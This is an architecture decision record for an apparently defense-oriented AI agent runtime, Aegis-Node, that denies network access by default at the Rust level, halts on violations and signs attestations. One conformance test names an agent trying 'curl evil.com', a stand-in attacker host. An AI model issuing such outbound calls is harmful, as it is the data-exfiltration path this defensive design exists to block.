# 8. Network-Deny-by-Default Enforced at Runtime, Not OS Firewall

**Status:** Accepted
**Date:** 2026-04-27
**Domain:** Security / Network Containment (F6)

## Context

The single most-asked exfiltration question in a security review is "can this thing call out?" Existing AI agent frameworks rely on the host OS firewall, on the operator running the agent in a Docker container with no network, or on hope. None of these are auditable from inside the runtime, none of them are portable across deployment tiers, and all of them depend on operators getting external configuration right.

A defense-grade product cannot delegate this guarantee to the operator; the runtime itself must produce a verifiable attestation that no network connection was made.

## Decision

Network access is denied by default and enforced at the Rust runtime level. Properties:

1. **Default = deny, both directions.** New deployments cannot make outbound or inbound network connections without explicit grants in the Permission Manifest (F2).
2. **Enforced inside the runtime, not by external firewall.** The agent process refuses to open sockets for non-allowlisted destinations regardless of host firewall state. This survives misconfigured hosts and containers.
3. **Critical violation on any deny-mode connection attempt.** Such attempts are written to the Trajectory Ledger (F9) as critical events and the agent is halted.
4. **Verifiable attestation.** At session end the runtime emits a signed attestation that the session made zero network connections (or only the connections the manifest allowed). The attestation is suitable for direct inclusion in a compliance report.
5. **Layered with platform controls.** The runtime guarantee does not replace cluster-level NetworkPolicies in Phase 2/3 — it stacks beneath them; both must agree.

## Consequences

**Positive:**
- Auditable answer to the exfiltration question that does not depend on operator configuration hygiene.
- A single guarantee that holds identically on a laptop, in Kubernetes, and in OpenShift.
- Critical-violation halt converts attempted exfiltration into an immediate incident signal rather than a silent success.

**Negative:**
- Requires intercepting network calls inside the inference engine and any tool plugin; tools that bring their own network stack (e.g., embedded HTTP clients) need wrapping or rejection.
- Cannot prevent covert channels through allowed I/O (e.g., DNS-over-HTTP through an allowlisted resolver). Defense-in-depth required for the defense market.
- Outbound-allow grants must specify host + port + protocol; broader grants undermine the model.

## Domain Considerations

The runtime-level guarantee is what differentiates Aegis-Node from "containerized agent" framings. A reviewer comparing "we recommend running it in a network-less container" to "the runtime refuses to open sockets" hears two very different stories.

## Implementation Plan

1. Implement a Rust network gate that wraps `std::net` and any HTTP client used by the inference engine; non-allowlisted connect calls return a deterministic error and emit a F9 violation event.
2. Wrap or reject tools that include their own network stacks; document the contract for tool authors.
3. Define attestation format (JSON-LD, signed by the agent's identity key).
4. In Phase 2, integrate with Kubernetes NetworkPolicies as belt-and-suspenders; document both layers in deployment guidance.
5. Conformance test: an agent attempting `curl evil.com` produces a critical ledger entry and zero outbound packets observable on the host.

## Related PRD Sections

- §4 F6 — Network-Deny-by-Default Mode
- §4 F2 — Permission Manifest

## Domain References

- NIST 800-53 SC-7 (Boundary Protection)
- Kubernetes NetworkPolicy
- gVisor / sandbox runtime isolation patterns
